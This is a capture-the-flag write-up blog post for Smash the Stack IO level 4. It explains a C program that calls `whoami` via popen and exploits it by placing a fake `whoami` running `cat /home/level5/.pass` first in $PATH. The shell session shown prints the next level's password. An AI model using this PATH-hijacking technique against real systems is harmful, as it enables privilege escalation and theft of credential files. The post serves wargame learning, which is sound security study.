---
title: "SMASH THE STACK LEVEL4"
date: 2014-12-03T13:27:27+00:00
url: "/smash-the-stack-level4/"
draft: false
description: "level 4 :D so i will read the code popen to execute whoami save the output in f fgets to read the output print f to print the output very simple one I don't..."
categories: ["Bash", "blog", "exploit-dev", "Linux", "Security", "tech"]
---

level 4 :D

```bash
level4@io:~$ cd /levels/
level4@io:/levels$ ./level04
Welcome level5
level4@io:/levels$ ./level04 d
Welcome level5
level4@io:/levels$ ./level04 $(python -c "print 'A' * 1024")
Welcome level5
```

so i will read the code

```c
int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

popen to execute whoami

save the output in f

fgets to read the output

print f to print the output

very simple one

I don't think it needs overflow :D

I can trick the software to read /home/level5/.pass

as it uses command whoami

and this command located in my system

it finds it through the $PATH

so this is the point

i will create new file in /tmp/level04/whoami

same name of the command

content

cat /home/level5/.pass

so when it runs my whoami then read the password

so I have to set the /tmp/level04 in my path variable + it should be loaded before any other apps in bins

```bash
level4@io:/levels$ echo $PATH
/tmp/level04/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
level4@io:/levels$ whoami
level4
level4@io:/levels$ mkdir /tmp/level04
level4@io:/levels$ vi /tmp/level04/whoami
level4@io:/levels$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
level4@io:/levels$ export PATH=/tmp/level04/:$PATH
level4@io:/levels$ whoami
level4
```

```bash
level4@io:/levels$ chmod +x /tmp/level04/whoami
level4@io:/levels$ ./level04
Welcome LOoCy5PbKi63qXTh
```

very simple for me
